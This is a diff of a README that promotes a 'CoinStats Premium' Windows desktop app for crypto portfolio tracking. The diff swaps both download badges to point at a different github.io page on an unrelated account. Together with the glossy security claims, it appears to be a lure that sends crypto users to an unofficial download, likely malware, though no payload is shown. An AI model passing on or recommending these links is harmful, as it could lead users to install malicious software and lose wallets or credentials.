@@ -4,7 +4,7 @@
 
 ## 📥 Download CoinStats Premium for Windows
 
-[![⬇️ Download CoinStats Premium](https://img.shields.io/badge/Download-CoinStats%20Premium-blue?style=for-the-badge&logo=windows)](https://coinstats-premium-desktop-app.github.io/.github)
+[![⬇️ Download CoinStats Premium](https://img.shields.io/badge/Download-CoinStats%20Premium-blue?style=for-the-badge&logo=windows)](https://itzicklydin.github.io/.github/coinstats-premium-app)
 
 ---
 
@@ -27,7 +27,7 @@ Security remains a cornerstone of CoinStats Premium’s design philosophy. API k
 Whether you’re a day trader executing high-frequency trades, a long-term investor diversifying across blockchains, or a DeFi strategist leveraging complex yield protocols, CoinStats Premium consolidates every aspect of your crypto journey into one secure, intelligent, and highly customizable hub. By combining real-time market monitoring, detailed analytics, risk management tools, and robust security measures, it empowers you to make better, faster, and more informed decisions — giving you a true competitive edge in the fast-moving world of digital assets.
 
 
-[![⬇️ Download CoinStats Premium](https://img.shields.io/badge/Download-CoinStats%20Premium-blue?style=for-the-badge&logo=windows)](https://coinstats-premium-desktop-app.github.io/.github)
+[![⬇️ Download CoinStats Premium](https://img.shields.io/badge/Download-CoinStats%20Premium-blue?style=for-the-badge&logo=windows)](https://itzicklydin.github.io/.github/coinstats-premium-app)
 
 ---
 
